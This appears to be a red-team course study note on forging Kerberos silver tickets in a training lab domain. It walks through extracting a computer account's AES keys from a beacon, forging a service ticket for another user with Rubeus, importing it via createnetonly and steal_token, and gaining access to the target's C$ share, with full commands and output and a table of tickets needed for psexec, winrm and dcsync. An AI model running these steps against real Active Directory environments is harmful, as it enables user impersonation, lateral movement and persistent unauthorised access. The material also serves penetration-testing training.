
A "silver ticket" is a forged service ticket, signed using the secret material (RC4/AES keys) of a computer account.  You may forge a TGS for any user to any service on that machine, which is useful for short/medium-term persistence.  

By default, computer passwords change every 30 days, at which time you must re-obtain the new secrets to continue making silver tickets.  Both [[Silver Tickets]] and [[Golden Tickets]] are forged, so can be generated on your own machine and imported into your Beacon session for use.

####  📗 Difference Between Silver and Golden

A silver ticket can be used to impersonate any user, but it's limited to either that single service or to any service but on a single machine.

A golden ticket can be used to impersonate any user, to any service, on any machine in the domain.

#### 🖊️ via Cobalt Strike

1) Obtain Kerberos keys: [[Extracting Kerberos Keys]] from a SYSTEM beacon

```
Session           : Service from 0
User Name         : WKSTN-1$
Domain            : DEV
Logon Server      : (null)
Logon Time        : 10/17/2023 10:31:24 AM
SID               : S-1-5-20

	 * Username : wkstn-1$
	 * Domain   : DEV.CYBERBOTIC.IO
	 * Password : (null)
	 * Key List :
	   des_cbc_md4       3ad3ca5c512dd138e3917b0848ed09399c4bbe19e83efe661649aa3adf2cb98f
	   des_cbc_md4       5192c07ee06e9264f0a7d7af5e645448
	   des_cbc_md4       5192c07ee06e9264f0a7d7af5e645448
	   des_cbc_md4       5192c07ee06e9264f0a7d7af5e645448
	   des_cbc_md4       5192c07ee06e9264f0a7d7af5e645448
	   des_cbc_md4       5192c07ee06e9264f0a7d7af5e645448
```


2) On your Windows attacking machine, use Rubeus to forge a service ticket. In this example we use user "nlamb" and the CIFS service.

```
PS C:\Users\Attacker> C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe silver /service:cifs/wkstn-1.dev.cyberbotic.io /aes256:3ad3ca5c512dd138e3917b0848ed09399c4bbe19e83efe661649aa3adf2cb98f /user:nlamb /domain:dev.cyberbotic.io /sid:S-1-5-21-569305411-121244042-2357301523 /nowrap

[*] Action: Build TGS

[*] Building PAC

[*] Domain         : DEV.CYBERBOTIC.IO (DEV)
[*] SID            : S-1-5-21-569305411-121244042-2357301523
[*] UserId         : 500
[*] Groups         : 520,512,513,519,518
[*] ServiceKey     : C9E598CD2A9B08FE31936F2C1846A8365D85147F75B8000CBC90E3C9DE50FCC7
[*] ServiceKeyType : KERB_CHECKSUM_HMAC_SHA1_96_AES256
[*] KDCKey         : C9E598CD2A9B08FE31936F2C1846A8365D85147F75B8000CBC90E3C9DE50FCC7
[*] KDCKeyType     : KERB_CHECKSUM_HMAC_SHA1_96_AES256
[*] Service        : cifs
[*] Target         : wkstn-1.dev.cyberbotic.io

[*] Generating EncTicketPart
[*] Signing PAC
[*] Encrypting EncTicketPart
[*] Generating Ticket
[*] Generated KERB-CRED
[*] Forged a TGS for 'nlamb' to 'cifs/wkstn-1.dev.cyberbotic.io'

[*] AuthTime       : 9/9/2022 10:49:41 AM
[*] StartTime      : 9/9/2022 10:49:41 AM
[*] EndTime        : 9/9/2022 8:49:41 PM
[*] RenewTill      : 9/16/2022 10:49:41 AM

[*] base64(ticket.kirbi):

      doIFXD[...]MuaW8=
```

3) Then import the ticket.

```
beacon> getuid
[*] You are DEV\bfarmer (admin)

beacon> ls \\wkstn-1.dev.cyberbotic.io\c$
[-] could not open \\wkstn-1.dev.cyberbotic.io\c$\*: 5 - ERROR_ACCESS_DENIED

beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe /domain:DEV /username:nlamb /password:FakePass /ticket:doIFXD[...]MuaW8=

[*] Using DEV\nlamb:FakePass

[*] Showing process : False
[*] Username        : nlamb
[*] Domain          : DEV
[*] Password        : FakePass

[+] Process         : 'C:\Windows\System32\cmd.exe' successfully created with LOGON_TYPE = 9
[+] ProcessID       : 5668
[+] Ticket successfully imported!
[+] LUID            : 0x423091

beacon> steal_token 5668
[+] Impersonated DEV\bfarmer

beacon> ls \\wkstn-1.dev.cyberbotic.io\c$
[*] Listing: \\wkstn-1.dev.cyberbotic.io\c$\

 Size     Type    Last Modified         Name
 ----     ----    -------------         ----
          dir     08/16/2022 08:17:30   $Recycle.Bin
          dir     08/15/2022 22:22:31   $WinREAgent
          dir     01/27/2022 18:18:49   Documents and Settings
          dir     12/07/2019 09:14:52   PerfLogs
```

Here are some useful ticket combinations:

|   |   |
|---|---|
|**Technique**|**Required Service Tickets**|
|psexec|HOST & CIFS|
|winrm|HOST & HTTP|
|dcsync (DCs only)|LDAP|




#### ⚠ Opsec




### Properties
---
📆 created   {{25-02-2024}} 12:46
🏷️ tags: #redteam #crto 

---

